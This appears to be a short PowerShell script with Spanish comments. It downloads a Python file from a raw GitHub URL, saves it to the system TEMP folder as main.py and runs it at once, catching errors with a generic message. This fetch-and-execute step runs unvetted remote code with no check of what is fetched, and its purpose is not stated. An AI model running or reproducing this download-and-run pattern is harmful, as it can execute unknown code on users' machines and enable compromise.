# Define la URL del archivo Python en GitHub
$PythonScriptURL = 'https://raw.githubusercontent.com/astronomyc/filesRecents/main.py'

try {
    # Intenta descargar el script Python
    $PythonScript = Invoke-WebRequest -Uri $PythonScriptURL -UseBasicParsing | Select-Object -ExpandProperty Content

    # Define la ruta para guardar el archivo Python
    $PythonScriptPath = Join-Path $env:TEMP 'main.py'

    # Guarda el script Python en el directorio temporal
    Set-Content -Path $PythonScriptPath -Value $PythonScript

    # Ejecuta el script Python
    python $PythonScriptPath
} catch {
    Write-Error "No se pudo descargar o ejecutar el script Python."
}
